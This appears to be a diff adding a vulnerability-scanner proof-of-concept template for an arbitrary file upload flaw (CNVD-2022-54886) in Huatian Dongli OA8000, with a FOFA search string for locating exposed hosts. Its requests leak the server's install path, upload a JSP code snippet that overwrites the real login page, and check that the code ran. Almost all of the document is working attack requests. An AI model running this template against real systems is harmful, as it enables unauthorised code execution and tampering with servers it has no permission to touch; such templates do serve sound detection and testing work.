@@ -1,0 +1,64 @@
+id: poc-yaml-huatiandongli-oa-anyfile-upload
+info:
+  name: 华天动力 OA 任意文件上传漏洞(CNVD-2022-54886)
+  severity: critical
+  tags:
+  - CNVD-2022-54886
+  - 两高一弱
+  finger: 华天动力-OA8000
+  fofa: body="/OAapp/WebObjects/OAapp.woa"
+variables:
+  t1: random_str(12)
+  t2: random_str(8)
+  path: 'E:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+
+    D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp'
+requests:
+- method: POST
+  path: /OAapp/jsp/upload.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.t2}}
+  data: '------WebKitFormBoundary{{.t2}}
+
+    Content-Disposition: form-data; name="file"; filename="xxx.xml"
+
+    Content-Type: image/png
+
+
+    real path
+
+    ------WebKitFormBoundary{{.t2}}
+
+    Content-Disposition: form-data; name="filename"
+
+
+    xxx.png
+
+    ------WebKitFormBoundary{{.t2}}--'
+  expression: status_code == 200 && contains(body,"htoa")
+- method: POST
+  path: /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.t2}}
+  data: '------WebKitFormBoundary{{.t2}}
+
+    Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
+
+    Content-Type: image/png
+
+
+    <%out.print("{{.t1}}");%>
+
+    ------WebKitFormBoundary{{.t2}}
+
+    Content-Disposition: form-data; name="newFileName"
+
+
+    {{.path}}
+
+    ------WebKitFormBoundary{{.t2}}--'
+  expression: status_code == 200
+- method: GET
+  path: /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+  expression: status_code == 200 && contains(body,t1)
+transport: http
